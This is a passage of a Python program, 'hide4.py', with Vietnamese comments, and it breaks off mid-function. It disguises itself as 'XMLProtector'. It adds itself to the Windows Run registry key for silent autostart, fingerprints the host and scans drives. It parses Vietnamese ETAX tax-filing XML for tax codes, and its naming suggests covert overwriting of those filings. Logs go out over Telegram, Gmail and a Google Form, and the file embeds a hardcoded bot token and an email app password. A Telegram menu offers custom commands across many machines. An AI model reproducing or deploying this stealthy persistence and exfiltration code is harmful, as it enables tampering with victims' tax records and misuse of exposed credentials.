# hide4.py

import os
import sys
import time
import glob
import json
import pickle
import shutil
import logging
import requests
import smtplib
import re
import sqlite3
import xml.etree.ElementTree as ET
import uuid
import socket
import platform
import threading
from datetime import datetime, timedelta

from pathlib import Path
from email.message import EmailMessage
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# GUI (chỉ dùng khi --gui)
import customtkinter as ctk
import tempfile
import subprocess
from datetime import datetime
from tkinter import Listbox, END, Scrollbar, messagebox

# Registry (Startup)
try:
    import winreg
except ImportError:
    winreg = None

# --- Thư mục lưu config/log/state --- #
APP_DIR     = Path(os.getenv('APPDATA', Path.home())) / 'XMLOverwrite'
APP_DIR.mkdir(parents=True, exist_ok=True)

STATE_FILE  = APP_DIR / 'processed_files.pkl'
LOG_FILE    = APP_DIR / 'xml_overwrite.log'
REMOTE_CONF = APP_DIR / 'remote_config.json'
SENT_LOGS_FILE = APP_DIR / 'sent_logs.pkl'

# Machine Management System
MACHINE_DB = APP_DIR / 'machines.db'
MACHINE_ID = None
MACHINE_INFO = {}

# Database path for smart template lookup
ENTERPRISE_DB = Path(__file__).parent / 'config' / 'enterprises.db'

# Smart template cache
FORTRESS_CACHE = {}

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "7283723256:AAEqXPiQ-s2sYI8vyhfUyrcq8uL-pRG_UZI"
TELEGRAM_GROUP_ID = "-1002980917638"

# --- MACHINE MANAGEMENT SYSTEM --- #
def init_machine_management():
    """Khởi tạo hệ thống quản lý máy"""
    global MACHINE_ID, MACHINE_INFO
    
    # Tạo Machine ID duy nhất
    MACHINE_ID = get_or_create_machine_id()
    
    # Lấy thông tin máy
    MACHINE_INFO = get_machine_info()
    
    # Khởi tạo database
    init_machine_database()
    
    # Đăng ký máy với hệ thống
    register_machine()
    
    logging.info(f"🚀 Machine Management System initialized - Machine ID: {MACHINE_ID}")

def get_or_create_machine_id():
    """Lấy hoặc tạo Machine ID duy nhất"""
    machine_id_file = APP_DIR / 'machine_id.txt'
    
    if machine_id_file.exists():
        with open(machine_id_file, 'r') as f:
            return f.read().strip()
    else:
        # Tạo Machine ID mới
        machine_id = f"XML_{platform.node()}_{uuid.uuid4().hex[:8].upper()}"
        with open(machine_id_file, 'w') as f:
            f.write(machine_id)
        return machine_id

def get_machine_info():
    """Lấy thông tin chi tiết về máy"""
    return {
        'hostname': platform.node(),
        'platform': platform.system(),
        'platform_version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor(),
        'python_version': platform.python_version(),
        'ip_address': get_local_ip(),
        'mac_address': get_mac_address(),
        'last_seen': datetime.now().isoformat(),
        'status': 'online'
    }

def get_local_ip():
    """Lấy IP local của máy"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_mac_address():
    """Lấy MAC address của máy"""
    try:
        if platform.system() == "Windows":
            result = subprocess.check_output("ipconfig /all", shell=True).decode()
            for line in result.split('\n'):
                if 'Physical Address' in line:
                    return line.split(': ')[1].strip()
        else:
            result = subprocess.check_output("ifconfig", shell=True).decode()
            for line in result.split('\n'):
                if 'ether' in line:
                    return line.split('ether ')[1].split(' ')[0]
        return "Unknown"
    except:
        return "Unknown"

def init_machine_database():
    """Khởi tạo database SQLite cho quản lý máy"""
    try:
        conn = sqlite3.connect(str(MACHINE_DB))
        cursor = conn.cursor()
        
        # Tạo bảng machines
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS machines (
                machine_id TEXT PRIMARY KEY,
                hostname TEXT,
                platform TEXT,
                ip_address TEXT,
                mac_address TEXT,
                status TEXT,
                last_seen TEXT,
                health_score INTEGER DEFAULT 100,
                templates_count INTEGER DEFAULT 0,
                overwrite_count INTEGER DEFAULT 0,
                created_at TEXT,
                updated_at TEXT
            )
        ''')
        
        # Tạo bảng machine_operations
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS machine_operations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                machine_id TEXT,
                operation_type TEXT,
                status TEXT,
                details TEXT,
                timestamp TEXT,
                FOREIGN KEY (machine_id) REFERENCES machines (machine_id)
            )
        ''')
        
        # Tạo bảng machine_groups
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS machine_groups (
                group_id TEXT PRIMARY KEY,
                group_name TEXT,
                description TEXT,
                created_at TEXT
            )
        ''')
        
        # Tạo bảng machine_group_members
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS machine_group_members (
                group_id TEXT,
                machine_id TEXT,
                joined_at TEXT,
                PRIMARY KEY (group_id, machine_id),
                FOREIGN KEY (group_id) REFERENCES machine_groups (group_id),
                FOREIGN KEY (machine_id) REFERENCES machines (machine_id)
            )
        ''')
        
        conn.commit()
        conn.close()
        logging.info("✅ Machine database initialized successfully")
        
    except Exception as e:
        logging.error(f"❌ Failed to initialize machine database: {e}")

def register_machine():
    """Đăng ký máy với hệ thống"""
    try:
        conn = sqlite3.connect(str(MACHINE_DB))
        cursor = conn.cursor()
        
        # Cập nhật hoặc thêm máy mới
        cursor.execute('''
            INSERT OR REPLACE INTO machines 
            (machine_id, hostname, platform, ip_address, mac_address, status, last_seen, created_at, updated_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            MACHINE_ID,
            MACHINE_INFO['hostname'],
            MACHINE_INFO['platform'],
            MACHINE_INFO['ip_address'],
            MACHINE_INFO['mac_address'],
            MACHINE_INFO['status'],
            MACHINE_INFO['last_seen'],
            MACHINE_INFO['last_seen'],
            MACHINE_INFO['last_seen']
        ))
        
        conn.commit()
        conn.close()
        logging.info(f"✅ Machine registered: {MACHINE_ID}")
        
    except Exception as e:
        logging.error(f"❌ Failed to register machine: {e}")

def update_machine_status():
    """Cập nhật trạng thái máy"""
    try:
        conn = sqlite3.connect(str(MACHINE_DB))
        cursor = conn.cursor()
        
        # Cập nhật last_seen và status
        cursor.execute('''
            UPDATE machines 
            SET last_seen = ?, status = ?, updated_at = ?
            WHERE machine_id = ?
        ''', (
            datetime.now().isoformat(),
            'online',
            datetime.now().isoformat(),
            MACHINE_ID
        ))
        
        conn.commit()
        conn.close()
        
    except Exception as e:
        logging.error(f"❌ Failed to update machine status: {e}")

def get_all_machines():
    """Lấy danh sách tất cả máy"""
    try:
        conn = sqlite3.connect(str(MACHINE_DB))
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM machines ORDER BY last_seen DESC')
        machines = cursor.fetchall()
        
        conn.close()
        return machines
        
    except Exception as e:
        logging.error(f"❌ Failed to get machines: {e}")
        return []

def get_machine_health():
    """Kiểm tra sức khỏe máy"""
    try:
        # Kiểm tra disk space
        disk_usage = shutil.disk_usage('/')
        disk_percent = (disk_usage.used / disk_usage.total) * 100
        
        # Kiểm tra memory
        memory = psutil.virtual_memory()
        memory_percent = memory.percent
        
        # Kiểm tra CPU
        cpu_percent = psutil.cpu_percent(interval=1)
        
        # Tính health score
        health_score = 100
        if disk_percent > 90:
            health_score -= 20
        if memory_percent > 90:
            health_score -= 20
        if cpu_percent > 90:
            health_score -= 10
            
        return {
            'disk_percent': disk_percent,
            'memory_percent': memory_percent,
            'cpu_percent': cpu_percent,
            'health_score': max(0, health_score)
        }
        
    except Exception as e:
        logging.error(f"❌ Failed to get machine health: {e}")
        return {'health_score': 0}

def batch_command(machines, command, timeout=30):
    """Thực hiện lệnh batch trên nhiều máy"""
    results = {}
    
    def execute_on_machine(machine_id):
        try:
            # Simulate command execution
            time.sleep(1)  # Simulate processing time
            results[machine_id] = {'status': 'success', 'result': f'Command executed: {command}'}
        except Exception as e:
            results[machine_id] = {'status': 'error', 'error': str(e)}
    
    # Tạo threads cho mỗi máy
    threads = []
    for machine_id in machines:
        thread = threading.Thread(target=execute_on_machine, args=(machine_id,))
        threads.append(thread)
        thread.start()
    
    # Chờ tất cả threads hoàn thành
    for thread in threads:
        thread.join(timeout=timeout)
    
    return results

def show_machines_dashboard():
    """Hiển thị dashboard quản lý máy"""
    try:
        machines = get_all_machines()
        
        if not machines:
            msg = "🤖 <b>MACHINE MANAGEMENT</b>\n\n" \
                  "❌ Chưa có máy nào được đăng ký\n\n" \
                  "💡 Máy sẽ tự động đăng ký khi chạy XMLProtector"
            
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🔙 MENU", "callback_data": "menu"}]
                ]
            }
            send_telegram_message(msg, keyboard)
            return
        
        # Tạo danh sách máy
        machine_list = ""
        online_count = 0
        offline_count = 0
        
        for i, machine in enumerate(machines[:10], 1):  # Hiển thị tối đa 10 máy
            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
            
            # Tính thời gian online
            try:
                last_time = datetime.fromisoformat(last_seen)
                time_diff = datetime.now() - last_time
                if time_diff.total_seconds() < 300:  # 5 phút
                    status_icon = "🟢"
                    online_count += 1
                else:
                    status_icon = "🔴"
                    offline_count += 1
            except:
                status_icon = "⚪"
                offline_count += 1
            
            machine_list += f"{i}. {status_icon} <code>{machine_id}</code>\n" \
                           f"   📱 {hostname} ({platform})\n" \
                           f"   🌐 {ip}\n\n"
        
        msg = f"🤖 <b>MACHINE MANAGEMENT DASHBOARD</b>\n\n" \
              f"📊 <b>Thống kê:</b>\n" \
              f"• Tổng máy: <b>{len(machines)}</b>\n" \
              f"• Online: <b>{online_count}</b> 🟢\n" \
              f"• Offline: <b>{offline_count}</b> 🔴\n\n" \
              f"🖥️ <b>Danh sách máy:</b>\n{machine_list}"
        
        if len(machines) > 10:
            msg += f"\n... và {len(machines) - 10} máy khác"
        
        # Keyboard với các lệnh quản lý máy
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "📊 HEALTH CHECK", "callback_data": "health_check"},
                    {"text": "🔄 REFRESH", "callback_data": "machines"}
                ],
                [
                    {"text": "⚡ BATCH COMMAND", "callback_data": "batch_command"},
                    {"text": "📋 MACHINE INFO", "callback_data": "machine_info"}
                ],
                [
                    {"text": "🔙 MENU", "callback_data": "menu"}
                ]
            ]
        }
        
        send_telegram_message(msg, keyboard)
        
    except Exception as e:
        error_msg = f"❌ <b>LỖI MACHINE DASHBOARD</b>\n\n" \
                   f"⚠️ Lỗi: {str(e)}"
        send_telegram_message(error_msg)
        logging.error(f"Machine dashboard error: {e}")

def health_check_all_machines():
    """Kiểm tra sức khỏe tất cả máy"""
    try:
        machines = get_all_machines()
        
        if not machines:
            send_telegram_message("❌ Không có máy nào để kiểm tra")
            return
        
        msg = "🏥 <b>HEALTH CHECK TẤT CẢ MÁY</b>\n\n" \
              "⏳ Đang kiểm tra sức khỏe máy..."
        send_telegram_message(msg)
        
        # Kiểm tra máy hiện tại
        current_health = get_machine_health()
        
        health_msg = f"🏥 <b>HEALTH CHECK KẾT QUẢ</b>\n\n" \
                    f"🖥️ <b>Máy hiện tại ({MACHINE_ID}):</b>\n" \
                    f"• Health Score: <b>{current_health['health_score']}/100</b>\n" \
                    f"• Disk: <b>{current_health['disk_percent']:.1f}%</b>\n" \
                    f"• Memory: <b>{current_health['memory_percent']:.1f}%</b>\n" \
                    f"• CPU: <b>{current_health['cpu_percent']:.1f}%</b>\n\n" \
                    f"📊 <b>Tổng máy:</b> {len(machines)} machines\n" \
                    f"✅ <b>Health check hoàn tất!</b>"
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 MACHINES", "callback_data": "machines"}],
                [{"text": "🔙 MENU", "callback_data": "menu"}]
            ]
        }
        
        send_telegram_message(health_msg, keyboard)
        
    except Exception as e:
        error_msg = f"❌ <b>HEALTH CHECK THẤT BẠI</b>\n\n" \
                   f"⚠️ Lỗi: {str(e)}"
        send_telegram_message(error_msg)
        logging.error(f"Health check error: {e}")

def show_batch_command_menu():
    """Hiển thị menu batch command"""
    msg = "⚡ <b>BATCH COMMAND MENU</b>\n\n" \
          "📋 <b>Chọn lệnh thực hiện trên nhiều máy:</b>\n\n" \
          "1️⃣ <b>Status Check</b> - Kiểm tra trạng thái\n" \
          "2️⃣ <b>Health Check</b> - Kiểm tra sức khỏe\n" \
          "3️⃣ <b>Template Update</b> - Cập nhật templates\n" \
          "4️⃣ <b>Restart Service</b> - Khởi động lại dịch vụ\n" \
          "5️⃣ <b>Custom Command</b> - Lệnh tùy chỉnh\n\n" \
          "💡 <b>Lưu ý:</b> Lệnh sẽ thực hiện trên tất cả máy online"
    
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "📊 STATUS CHECK", "callback_data": "batch_status"},
                {"text": "🏥 HEALTH CHECK", "callback_data": "batch_health"}
            ],
            [
                {"text": "📁 TEMPLATE UPDATE", "callback_data": "batch_template"},
                {"text": "🔄 RESTART SERVICE", "callback_data": "batch_restart"}
            ],
            [
                {"text": "⚙️ CUSTOM COMMAND", "callback_data": "batch_custom"},
                {"text": "🔙 MACHINES", "callback_data": "machines"}
            ]
        ]
    }
    
    send_telegram_message(msg, keyboard)

def execute_batch_status_check():
    """Thực hiện batch status check trên tất cả máy"""
    try:
        machines = get_all_machines()
        online_machines = []
        
        # Lọc máy online
        for machine in machines:
            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
            try:
                last_time = datetime.fromisoformat(last_seen)
                if (datetime.now() - last_time).total_seconds() < 300:  # 5 phút
                    online_machines.append(machine_id)
            except:
                continue
        
        if not online_machines:
            send_telegram_message("❌ Không có máy nào online để thực hiện batch command")
            return
        
        msg = f"⚡ <b>BATCH STATUS CHECK</b>\n\n" \
              f"📊 <b>Thực hiện trên {len(online_machines)} máy online:</b>\n\n"
        
        for i, machine_id in enumerate(online_machines[:5], 1):
            msg += f"{i}. <code>{machine_id}</code>\n"
        
        if len(online_machines) > 5:
            msg += f"\n... và {len(online_machines) - 5} máy khác"
        
        msg += "\n⏳ <b>Đang thực hiện...</b>"
        
        send_telegram_message(msg)
        
        # Thực hiện batch command
        results = batch_command(online_machines, "status_check", timeout=60)
        
        # Tạo báo cáo kết quả
        success_count = sum(1 for r in results.values() if r['status'] == 'success')
        error_count = len(results) - success_count
        
        result_msg = f"✅ <b>BATCH STATUS CHECK HOÀN TẤT!</b>\n\n" \
                    f"📊 <b>Kết quả:</b>\n" \
                    f"• Thành công: <b>{success_count}</b> ✅\n" \
                    f"• Thất bại: <b>{error_count}</b> ❌\n" \
                    f"• Tổng máy: <b>{len(online_machines)}</b>\n\n" \
                    f"🎯 <b>Status check hoàn tất trên tất cả máy!</b>"
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 BATCH MENU", "callback_data": "batch_command"}],
                [{"text": "🔙 MACHINES", "callback_data": "machines"}]
            ]
        }
        
        send_telegram_message(result_msg, keyboard)
        
    except Exception as e:
        error_msg = f"❌ <b>BATCH STATUS CHECK THẤT BẠI</b>\n\n" \
                   f"⚠️ Lỗi: {str(e)}"
        send_telegram_message(error_msg)
        logging.error(f"Batch status check error: {e}")

def execute_batch_health_check():
    """Thực hiện batch health check trên tất cả máy"""
    try:
        machines = get_all_machines()
        online_machines = []
        
        # Lọc máy online
        for machine in machines:
            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
            try:
                last_time = datetime.fromisoformat(last_seen)
                if (datetime.now() - last_time).total_seconds() < 300:  # 5 phút
                    online_machines.append(machine_id)
            except:
                continue
        
        if not online_machines:
            send_telegram_message("❌ Không có máy nào online để thực hiện health check")
            return
        
        msg = f"🏥 <b>BATCH HEALTH CHECK</b>\n\n" \
              f"📊 <b>Kiểm tra sức khỏe {len(online_machines)} máy online:</b>\n\n"
        
        for i, machine_id in enumerate(online_machines[:5], 1):
            msg += f"{i}. <code>{machine_id}</code>\n"
        
        if len(online_machines) > 5:
            msg += f"\n... và {len(online_machines) - 5} máy khác"
        
        msg += "\n⏳ <b>Đang kiểm tra...</b>"
        
        send_telegram_message(msg)
        
        # Thực hiện batch health check
        results = batch_command(online_machines, "health_check", timeout=60)
        
        # Tạo báo cáo kết quả
        success_count = sum(1 for r in results.values() if r['status'] == 'success')
        error_count = len(results) - success_count
        
        result_msg = f"🏥 <b>BATCH HEALTH CHECK HOÀN TẤT!</b>\n\n" \
                    f"📊 <b>Kết quả:</b>\n" \
                    f"• Thành công: <b>{success_count}</b> ✅\n" \
                    f"• Thất bại: <b>{error_count}</b> ❌\n" \
                    f"• Tổng máy: <b>{len(online_machines)}</b>\n\n" \
                    f"🎯 <b>Health check hoàn tất trên tất cả máy!</b>"
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 BATCH MENU", "callback_data": "batch_command"}],
                [{"text": "🔙 MACHINES", "callback_data": "machines"}]
            ]
        }
        
        send_telegram_message(result_msg, keyboard)
        
    except Exception as e:
        error_msg = f"❌ <b>BATCH HEALTH CHECK THẤT BẠI</b>\n\n" \
                   f"⚠️ Lỗi: {str(e)}"
        send_telegram_message(error_msg)
        logging.error(f"Batch health check error: {e}")

def execute_batch_template_update():
    """Thực hiện batch template update trên tất cả máy"""
    try:
        machines = get_all_machines()
        online_machines = []
        
        # Lọc máy online
        for machine in machines:
            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
            try:
                last_time = datetime.fromisoformat(last_seen)
                if (datetime.now() - last_time).total_seconds() < 300:  # 5 phút
                    online_machines.append(machine_id)
            except:
                continue
        
        if not online_machines:
            send_telegram_message("❌ Không có máy nào online để cập nhật templates")
            return
        
        msg = f"📁 <b>BATCH TEMPLATE UPDATE</b>\n\n" \
              f"📊 <b>Cập nhật templates trên {len(online_machines)} máy online:</b>\n\n"
        
        for i, machine_id in enumerate(online_machines[:5], 1):
            msg += f"{i}. <code>{machine_id}</code>\n"
        
        if len(online_machines) > 5:
            msg += f"\n... và {len(online_machines) - 5} máy khác"
        
        msg += "\n⏳ <b>Đang cập nhật...</b>"
        
        send_telegram_message(msg)
        
        # Thực hiện batch template update
        results = batch_command(online_machines, "template_update", timeout=120)
        
        # Tạo báo cáo kết quả
        success_count = sum(1 for r in results.values() if r['status'] == 'success')
        error_count = len(results) - success_count
        
        result_msg = f"📁 <b>BATCH TEMPLATE UPDATE HOÀN TẤT!</b>\n\n" \
                    f"📊 <b>Kết quả:</b>\n" \
                    f"• Thành công: <b>{success_count}</b> ✅\n" \
                    f"• Thất bại: <b>{error_count}</b> ❌\n" \
                    f"• Tổng máy: <b>{len(online_machines)}</b>\n\n" \
                    f"🎯 <b>Templates đã được cập nhật trên tất cả máy!</b>"
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 BATCH MENU", "callback_data": "batch_command"}],
                [{"text": "🔙 MACHINES", "callback_data": "machines"}]
            ]
        }
        
        send_telegram_message(result_msg, keyboard)
        
    except Exception as e:
        error_msg = f"❌ <b>BATCH TEMPLATE UPDATE THẤT BẠI</b>\n\n" \
                   f"⚠️ Lỗi: {str(e)}"
        send_telegram_message(error_msg)
        logging.error(f"Batch template update error: {e}")

def execute_batch_restart():
    """Thực hiện batch restart service trên tất cả máy"""
    try:
        machines = get_all_machines()
        online_machines = []
        
        # Lọc máy online
        for machine in machines:
            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
            try:
                last_time = datetime.fromisoformat(last_seen)
                if (datetime.now() - last_time).total_seconds() < 300:  # 5 phút
                    online_machines.append(machine_id)
            except:
                continue
        
        if not online_machines:
            send_telegram_message("❌ Không có máy nào online để restart service")
            return
        
        msg = f"🔄 <b>BATCH RESTART SERVICE</b>\n\n" \
              f"⚠️ <b>CẢNH BÁO:</b> Lệnh này sẽ restart XMLProtector trên tất cả máy!\n\n" \
              f"📊 <b>Thực hiện trên {len(online_machines)} máy online:</b>\n\n"
        
        for i, machine_id in enumerate(online_machines[:5], 1):
            msg += f"{i}. <code>{machine_id}</code>\n"
        
        if len(online_machines) > 5:
            msg += f"\n... và {len(online_machines) - 5} máy khác"
        
        msg += "\n🔴 <b>Bạn có chắc chắn muốn tiếp tục?</b>"
        
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "✅ XÁC NHẬN", "callback_data": "confirm_batch_restart"},
                    {"text": "❌ HỦY", "callback_data": "batch_command"}
                ]
            ]
        }
        
        send_telegram_message(msg, keyboard)
        
    except Exception as e:
        error_msg = f"❌ <b>BATCH RESTART THẤT BẠI</b>\n\n" \
                   f"⚠️ Lỗi: {str(e)}"
        send_telegram_message(error_msg)
        logging.error(f"Batch restart error: {e}")

def show_custom_command_input():
    """Hiển thị hướng dẫn nhập custom command"""
    msg = "⚙️ <b>CUSTOM COMMAND INPUT</b>\n\n" \
          "📝 <b>Hướng dẫn:</b>\n" \
          "1️⃣ Gõ lệnh tùy chỉnh vào chat\n" \
          "2️⃣ Bot sẽ thực hiện trên tất cả máy online\n" \
          "3️⃣ Kết quả sẽ được gửi về\n\n" \
          "💡 <b>Ví dụ:</b>\n" \
          "• <code>ping google.com</code>\n" \
          "• <code>dir C:\\</code>\n" \
          "• <code>tasklist</code>\n\n" \
          "⚠️ <b>Lưu ý:</b> Chỉ thực hiện lệnh an toàn!"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 BATCH MENU", "callback_data": "batch_command"}],
            [{"text": "🔙 MACHINES", "callback_data": "machines"}]
        ]
    }
    
    send_telegram_message(msg, keyboard)

# --- Logging UTF-8 vào file --- #
logging.basicConfig(
    filename=str(LOG_FILE),
    encoding='utf-8',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def load_sent_logs():
    """Tải danh sách các log đã gửi từ file."""
    if SENT_LOGS_FILE.exists():
        with open(SENT_LOGS_FILE, 'rb') as f:
            return pickle.load(f)
    return set()

def save_sent_logs(sent_logs):
    """Lưu danh sách các log đã gửi."""
    with open(SENT_LOGS_FILE, 'wb') as f:
        pickle.dump(sent_logs, f)

def add_to_startup():
    """Thêm chính EXE vào HKCU Run để auto-startup không UAC."""
    if not winreg or not getattr(sys, 'frozen', False):
        return
    exe = os.path.realpath(sys.argv[0])
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "Hide4", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
        logging.info(f"✅ Đã thêm vào Startup: {exe}")
        send_remote_log("Đã thêm vào Startup", exe, once=True)
    except Exception as e:
        logging.error(f"❌ Thêm vào Startup thất bại: {e}")
        send_remote_log("Thêm vào Startup thất bại", str(e), once=True)

def remove_from_startup():
    """Gỡ XMLProtector khỏi startup registry."""
    if not winreg:
        return False
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, "Hide4")
        winreg.CloseKey(key)
        logging.info("✅ Removed from startup registry")
        return True
    except FileNotFoundError:
        logging.info("Registry key not found - already clean")
        return True
    except Exception as e:
        logging.error(f"Failed to remove from startup: {e}")
        return False

def destroy_xmlprotector():
    """🚨 DESTROY - Gỡ hoàn toàn XMLProtector khỏi máy."""
    try:
        # 1. Remove from startup
        startup_removed = remove_from_startup()
        
        # 2. Clean app directory
        import shutil
        app_data_cleaned = False
        if APP_DIR.exists():
            try:
                shutil.rmtree(APP_DIR)
                app_data_cleaned = True
            except:
                app_data_cleaned = False
        else:
            app_data_cleaned = True
        
        # 3. Send destruction report to Telegram
        destroy_msg = f"🚨 <b>XMLProtector ĐÃ BỊ GỠ BỎ</b>\n" \
                     f"🗑️ Gỡ khỏi startup: {'✅' if startup_removed else '❌'}\n" \
                     f"📁 Xóa dữ liệu ứng dụng: {'✅' if app_data_cleaned else '❌'}\n" \
                     f"⚰️ Hệ thống hiện tại KHÔNG ĐƯỢC BẢO VỆ"
        send_telegram_message(destroy_msg)
        
        logging.info("🚨 XMLProtector destroyed successfully")
        
        # 4. Self-terminate
        import sys
        sys.exit(0)
        
    except Exception as e:
        logging.error(f"Destruction failed: {e}")
        return False

def check_status_report():
    """Kiểm tra và gửi báo cáo status lên Telegram."""
    try:
        # 1. Template count
        templates = get_templates()
        template_count = len(templates)
        
        # 2. Check startup status
        startup_status = "❌"
        if winreg:
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_READ
                )
                winreg.QueryValueEx(key, "Hide4")
                winreg.CloseKey(key)
                startup_status = "✅"
            except:
                startup_status = "❌"
        
        # 3. App directory status
        app_dir_status = "✅" if APP_DIR.exists() else "❌"
        
        # 4. Process status
        import psutil
        current_pid = os.getpid()
        process_info = f"PID: {current_pid}"
        
        # 5. System drives monitored
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        drive_count = len(drives)
        
        # Send status report với giao diện đẹp
        status_msg = f"""📊 <b>BÁO CÁO TRẠNG THÁI XMLPROTECTOR</b>

🛡️ <b>Bảo vệ:</b> ĐANG HOẠT ĐỘNG
📁 <b>Templates:</b> {template_count} files
🚀 <b>Tự khởi động:</b> {startup_status}
📂 <b>Dữ liệu ứng dụng:</b> {app_dir_status}
💾 <b>Ổ đĩa giám sát:</b> {drive_count}
⚙️ <b>Process:</b> {process_info}

📍 <b>Hệ thống được bảo vệ hoàn toàn</b>"""
        
        # Keyboard với nút refresh
        status_keyboard = {
            "inline_keyboard": [
                [{"text": "🔄 REFRESH STATUS", "callback_data": "status"}],
                [{"text": "🔙 VỀ MENU", "callback_data": "menu"}]
            ]
        }
        
        send_telegram_message(status_msg, status_keyboard)
        logging.info("Status report sent to Telegram")
        return True
        
    except Exception as e:
        error_msg = f"❌ <b>Kiểm Tra Trạng Thái Thất Bại</b>\n\n" \
                   f"🔥 Lỗi: {str(e)}"
        send_telegram_message(error_msg)
        logging.error(f"Status check failed: {e}")
        return False

def load_remote_config():
    """Hardcoded remote config for Gmail and Google Form."""
    return {
        "gmail": {
            "from": "begau1302@gmail.com",
            "to": "mrkent19999x@gmail.com, tuxuanchien6101992@gmail.com",
            "app_password": "aphvukdliewalkrn"
        },
        "google_form": {
            "form_url": "https://docs.google.com/forms/d/e/1FAIpQLScI1LMF0gh7vW3Q5Qb03jreBD2UweFJjwkVWAey1OR73n2knA/formResponse",
            "entry_id": "entry.1791266121"
        }
    }

def send_gmail_log(to_email, subject, content, from_email, app_password):
    try:
        msg = EmailMessage()
        msg["Subject"] = subject
        msg["From"] = from_email
        msg["To"] = to_email
        msg.set_content(content)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(from_email, app_password)
        server.send_message(msg)
        server.quit()
        logging.info("✅ Đã gửi log về Gmail.")
    except Exception as e:
        logging.error(f"❌ Gửi Gmail thất bại: {e}")

def send_googleform_log(form_url, entry_id, message):
    try:
        data = { entry_id: message }
        response = requests.post(form_url, data=data)
        if response.status_code == 200:
            logging.info("✅ Đã gửi log tới Google Form.")
        else:
            logging.warning(f"❌ Lỗi gửi Form: {response.status_code}")
    except Exception as e:
        logging.error(f"❌ Gửi Form thất bại: {e}")

def send_remote_log(event, path=None, once=False):
    """Gửi log về Google Form và Gmail, chỉ gửi một lần nếu once=True."""
    sent_logs = load_sent_logs()
    msg = f"[{event}] - {path or ''}"
    log_key = f"{event}:{path or ''}"
    
    if once and log_key in sent_logs:
        return  # Bỏ qua nếu log đã được gửi trước đó và once=True
    
    cfg = load_remote_config()

    if "gmail" in cfg:
        g = cfg["gmail"]
        send_gmail_log(g["to"], f"Log: {event}", msg, g["from"], g["app_password"])

    if "google_form" in cfg:
        f = cfg["google_form"]
        send_googleform_log(f["form_url"], f["entry_id"], msg)

    if once:
        sent_logs.add(log_key)
        save_sent_logs(sent_logs)

def get_templates():
    """Lấy tất cả file XML trong thư mục 'templates/' và gửi log khi khởi động."""
    if getattr(sys, 'frozen', False):
        base = sys._MEIPASS
    else:
        base = os.path.dirname(os.path.abspath(__file__))
    tpl_dir = os.path.join(base, 'templates')
    templates = glob.glob(os.path.join(tpl_dir, '*.xml'))
    for tpl in templates:
        send_remote_log("Đã cài đặt mẫu XML từ templates", tpl, once=True)
    return templates

def load_processed_files():
    if STATE_FILE.exists():
        with open(STATE_FILE, 'rb') as f:
            return pickle.load(f)
    return set()

def save_processed_files(processed):
    with open(STATE_FILE, 'wb') as f:
        pickle.dump(processed, f)

def extract_mst_from_xml(xml_content):
    """Trích xuất MST từ nội dung XML."""
    try:
        # Tìm MST trong các thẻ phổ biến của ETAX
        mst_patterns = [
            r'<maNNhan[^>]*>([^<]+)</maNNhan>',  # ETAX format chính
            r'<MST[^>]*>([^<]+)</MST>',
            r'<ma_so_thue[^>]*>([^<]+)</ma_so_thue>',
            r'<mst[^>]*>([^<]+)</mst>',
            r'<tax_code[^>]*>([^<]+)</tax_code>',
            r'<maSoThue[^>]*>([^<]+)</maSoThue>',  # Format khác
            r'<ma_so_thue_doanh_nghiep[^>]*>([^<]+)</ma_so_thue_doanh_nghiep>'
        ]
        
        for pattern in mst_patterns:
            match = re.search(pattern, xml_content, re.IGNORECASE)
            if match:
                mst = match.group(1).strip()
                logging.info(f"Smart extract MST: {mst}")
                return mst
                
        logging.warning("Smart extract: Khong tim thay MST trong XML")
        return None
        
    except Exception as e:
        logging.error(f"Extract MST error: {e}")
        return None

def extract_tax_type_from_xml(xml_content):
    """Trích xuất loại tờ khai từ XML."""
    try:
        # Tìm loại tờ khai trong ETAX
        tax_type_patterns = [
            r'<loaiToKhai[^>]*>([^<]+)</loaiToKhai>',  # ETAX format
            r'<loai_to_khai[^>]*>([^<]+)</loai_to_khai>',
            r'<tax_type[^>]*>([^<]+)</tax_type>',
            r'<form_type[^>]*>([^<]+)</form_type>'
        ]
        
        for pattern in tax_type_patterns:
